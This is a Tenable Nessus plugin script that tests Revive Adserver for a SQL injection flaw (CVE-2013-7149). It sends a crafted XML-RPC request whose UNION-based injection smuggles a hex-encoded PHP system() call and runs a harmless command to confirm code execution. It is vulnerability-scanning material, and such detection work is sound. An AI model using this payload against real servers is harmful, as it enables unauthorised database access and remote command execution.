#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76254);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:20 $");

  script_cve_id("CVE-2013-7149");
  script_bugtraq_id(64463);
  script_osvdb_id(101249);

  script_name(english:"Revive Adserver 'www/delivery/axmlrpc.php' 'what' Parameter SQL Injection");
  script_summary(english:"Attempts a SQL injection attack.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Revive Adserver install hosted on the remote web server is
affected by a SQL injection vulnerability because the
'www/delivery/axmlrpc.php' script fails to properly sanitize
user-supplied input passed to the 'what' parameter. This can allow a
remote, unauthenticated attacker to execute arbitrary SQL statements
against the back-end database, leading to execution of arbitrary code,
manipulation of data, or disclosure of arbitrary data.");
  # http://www.kreativrauschen.com/blog/2013/12/18/zero-day-vulnerability-in-openx-source-2-8-11-and-revive-adserver-3-0-1/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bc95cc7a");
  script_set_attribute(attribute:"see_also", value:"http://www.revive-adserver.com/security/revive-sa-2013-001/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 3.0.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"OpenX 2.8.11 SQL Injection");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/12/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/12/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/06/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:revive-adserver:revive_adserver");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("revive_adserver_detect.nbin", "os_fingerprint.nasl");
  script_require_keys("www/PHP", "www/revive_adserver");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);
app = "Revive Adserver";

install = get_install_from_kb(
  appname : "revive_adserver",
  port    : port,
  exit_on_fail : TRUE
);
dir = install["dir"];
install_url = build_url(port:port, qs:dir + "/index.php");
dir = dir - "/admin";

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

script = SCRIPT_NAME - ".nasl" + '-' + unixtime();
vuln = FALSE;

foreach cmd (cmds)
{
  attack = hexstr("1);echo('"+script+" ');system('"+cmd+"');exit;/*");

  postdata =
    '<methodCall>\n' +
    '<methodName>openads.view</methodName>\n' +
    '<params>\n' +
    '  <param>\n' +
    '  <value>\n' +
    '  <struct>\n' +
    '  <member>\n' +
    '    <name>remote_addr</name>\n' +
    '    <value>127.0.0.1</value>\n' +
    '  </member>\n' +
    '  <member>\n' +
    '  </member>\n' +
    '  <member>\n' +
    '    <name>cookies</name>\n' +
    '    <value>\n' +
    '    <array>' + rand() + '</array>\n' +
    '  </value>\n' +
    '  </member>\n' +
    '  </struct>\n' +
    '  </value>\n' +
    '  </param>\n' +
    "  <param><value><string>height:1') OR 1=1 UNION (SELECT * FROM (SELECT " +
    "1)a JOIN (SELECT 1)b JOIN (SELECT 0)c JOIN (SELECT 'html')d JOIN (SELECT"+
    " '')e JOIN (SELECT 1)f JOIN (SELECT 0)g JOIN (SELECT '')h JOIN (SELECT " +
    "1)i JOIN (SELECT '')j JOIN (SELECT 0)k JOIN (SELECT 0)l JOIN (SELECT 0)m" +
    " JOIN (SELECT 0x" + attack + ")n JOIN (SELECT '')o JOIN (SELECT " +
    "'errormessage.gif')p JOIN (SELECT 0)q JOIN (SELECT 2)r JOIN (SELECT 2)s" +
    " JOIN (SELECT 1)t JOIN (SELECT 1)u JOIN (SELECT 10)v JOIN (SELECT 2)w " +
    "JOIN (SELECT 0)x JOIN (SELECT 0)y JOIN (SELECT 0)z JOIN (SELECT 0)aa " +
    "JOIN (SELECT 2)ab JOIN (SELECT null)ac JOIN (SELECT 0)ad JOIN (SELECT " +
    "0)ae JOIN (SELECT null)af JOIN (SELECT null)ag JOIN (SELECT 0)ah JOIN " +
    "(SELECT 0)ai ) ORDER BY ad_id DESC LIMIT 1;#</string></value></param>" +
    '\n  <param><value><int>1</int></value></param>\n' +
    '  <param><value><string>' + rand_str() + '</string></value></param>\n' +
    '  <param><value><string>' + rand_str() + '</string></value></param>\n' +
    '  <param><value><boolean>1</boolean></value></param>\n' +
    '  <param><value><array><data>'+rand()+'</data></array></value></param>\n' +
    '</params>\n' +
    '</methodCall>\n';

  res = http_send_recv3(
    method : "POST",
    port   : port,
    item   : dir + "/delivery/axmlrpc.php",
    data   : postdata,
    content_type : "application/x-www-form-urlencoded",
    exit_on_fail : TRUE
  );

  if (egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    vuln = TRUE;
    break;
  }
}

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

set_kb_item(name:"www/"+port+"/SQLInjection", value:TRUE);

if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report =
    '\n' + 'Nessus was able to verify the issue exists using the following request :' +
    '\n' +
    '\n' + http_last_sent_request() +
    '\n' +
    '\n';
  if (report_verbosity > 1)
  {
    output = res[2] - script;
    report +=
      '\n' + 'This used a SQL query to execute the command "' + cmd + '" which' +
      '\n' + 'produced the following output :' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(output) +
      '\n' + snip +
      '\n';
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
